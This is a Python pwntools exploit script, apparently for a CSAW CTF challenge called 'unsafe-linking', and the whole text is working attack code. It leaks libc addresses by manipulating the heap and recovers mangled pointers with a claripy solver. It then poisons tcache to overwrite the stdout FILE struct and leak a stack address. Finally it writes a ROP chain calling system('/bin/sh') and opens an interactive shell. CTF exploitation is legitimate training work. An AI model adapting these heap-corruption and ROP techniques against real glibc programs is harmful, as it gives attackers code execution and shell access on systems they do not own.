from pwn import *
import claripy

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'debug'
#p = process("unsafe-linking_patched")
#gdb.attach(p, gdbscript="""
#c
##""")

p = remote("pwn.chal.csaw.io", 5003)

def create_not_secret(idx, data, l=None, final=False):
    assert l is not None or b"\x0a" not in data
    if l is None:
        l = len(data)
    p.sendline("1")
    p.sendline("0")
    p.sendline(str(idx))
    p.sendline(str(l))
    p.send(data)
    if final:
        return
    return p.recvuntil("> ")

def create_secret(idx, data):
    p.sendline("1")
    p.sendline("1")
    p.sendline(str(idx))
    if b"\n" == data[-1:]:
        p.send(data)
    else:
        p.send(data.ljust(8, b"\x00"))
    p.recvuntil("> ")

def delete(idx):
    p.sendline("2")
    p.sendline(str(idx))
    p.recvuntil("> ")

def leak(idx):
    p.sendline("3")
    p.sendline(str(idx))
    # Secret 0x981c42e3c(off= 981c4474e)
    p.recvuntil("Secret ")
    line = p.recvline().decode()
    leak1 = int(line.split("(")[0], 16)
    leak2 = int(line.split("= ")[1][:-2], 16)
    p.recvuntil("> ")
    return leak1, leak2

def compute_leaks_symbolic(rand_val, p):
    xor_leak = claripy.LShR(rand_val, 0x1c) ^ p
    sub_leak = claripy.LShR(rand_val, 0x1c) - (p >> 0xc)
    return xor_leak, sub_leak

def compute_orig_ptr(xor_leak, sub_leak):
    s = claripy.Solver()
    rand = claripy.BVS('rand', 64)
    orig_ptr = claripy.BVS('orig', 64)
    #protected = claripy.LShR(orig_ptr, 12) ^ orig_ptr

    #xor_leak_symbolic, sub_leak_symbolic = compute_leaks_symbolic(rand, protected)
    xor_leak_symbolic, sub_leak_symbolic = compute_leaks_symbolic(rand, orig_ptr)

    s.add(xor_leak_symbolic == claripy.BVV(xor_leak, 64))
    s.add(sub_leak_symbolic == claripy.BVV(sub_leak, 64))

    orig_ptr = s.eval(orig_ptr, 1)[0]
    return orig_ptr


p.recvuntil("> ")

# PART 1: Libc leak

create_not_secret(0, b"YOLOYOLO"*2)
create_not_secret(1, b"YOLOYOLO"*2)
create_not_secret(2, b"YOLOYOLO"*2)
create_not_secret(3, b"YOLOYOLO"*2+b"\n", l=0x1000)
create_not_secret(4, b"YOLOYOLO"*2)

delete(0)
delete(1)
delete(2)
delete(3) # Input buffer Free'd into unsorted bin

# The 0x20 tcache is now full

delete(4) # This input buffer and note are adjacent to 3's input buffer
create_secret(0, b"\n")
create_secret(1, b"\n")
create_secret(2, b"\n")
create_not_secret(3, b"\n", l=0x1080) # 3 and 4 will be consolidated

delete(3) # free the consolidated chunk, returns to wilderness
create_secret(4, b"\n")

# main arena at the notepage at 4

leak1, leak2 = leak(4)
print(f"leak1: {hex(leak1)} leak2: {hex(leak2)}")
leak_revealed = compute_orig_ptr(leak1, leak2)
print(f"leak: {hex(leak_revealed)}")

# PART 2: Make fake overlapping chunks (in mmap-d region) using arbitrary free

# Arbitrary free
# (trashes 0x70 bins)
def arb_free(addr):
    create_not_secret(0, b"\n", l=0x60)
    create_not_secret(1, b"\n", l=0x60)
    delete(0)
    delete(1)
    create_not_secret(3, p64(addr) + b"\n", l=0x10)
    delete(0)

mmap_payload = b"yolo" * 2 + p64(0x221) + b"E" * 0x18 + (p64(0x41) + b"A" * 0x38) * 8 + b"/bin/sh\0" # one big 0x220 chunk, and then a few 0x40 chunks that overlap with it
create_not_secret(4, mmap_payload+b"\n", l=0x20000) # mmapped region!

mmap_payload_base = leak_revealed - 0x23dcd0

# PART 3: Poison tcache to gain arbitrary write in _IO_FILE struct. Use it to leak stack pointer.

arb_free(mmap_payload_base+16)
arb_free(mmap_payload_base+16 + 0x20 + 0x40) # chunk 2
arb_free(mmap_payload_base+16 + 0x20) # chunk 1

def protect(cur_chunk_addr, link_val):
    return (cur_chunk_addr >> 12) ^ link_val

# print(hex(leak_revealed))
stdout_addr = leak_revealed + 0xaa0

# Posion the fwd pointer of chunk 1 so that ptr to stdout structure will be returned later
create_not_secret(10, b"E" * 0x18 + p64(0x41) + p64(protect(mmap_payload_base, stdout_addr)) + b"\n", l=0x210)

# now lets pull the 0x40 chunks and write into stdout!
create_not_secret(0, b"\n", l=0x38)

stack_leak_addr = (leak_revealed + 0x7520) & ~0xff
leak = create_not_secret(1, p64(0xfbad2887)+p64(stack_leak_addr)+p64(stack_leak_addr)+p64(stack_leak_addr)+p64(stack_leak_addr)+p64(stack_leak_addr+0x2000)+p64(stack_leak_addr), l=0x38)
leak = leak.split(b"Content:\n")[1][:8]
stack_leak = u64(leak)

print(f"Stack: {hex(stack_leak)}")

# PART 4: Repeat the process (posion tcache to get arbitrary write) to write a ROP chain onto the stack.

delete(10)
arb_free(mmap_payload_base+16 + 0x20 + 0xc0) # chunk 4
arb_free(mmap_payload_base+16 + 0x20 + 0x80) # chunk 3

stack_target = stack_leak - 0x148
# Posion the fwd pointer of chunk 3 so that ptr to stack will be returned later
create_not_secret(10, b"E" * 0x18 + b"Q" * 0x80 + p64(0x41) + p64(protect(mmap_payload_base, stack_target)) + b"\n", l=0x210) #+ b"G" * 0x30 + p64(0x40) + b"\n", l=0x210)
create_not_secret(0, b"\n", l=0x38)

context.arch = "amd64"
e = ELF('libc.so.6')
e.address = leak_revealed-0x219ce0
r = ROP(e)
r.call(r.find_gadget(["ret"]))
r.system(mmap_payload_base+0x228)
print(r.dump())
create_not_secret(0, p64(0) + r.chain() + b"\n", l=0x38, final=True)

p.interactive()

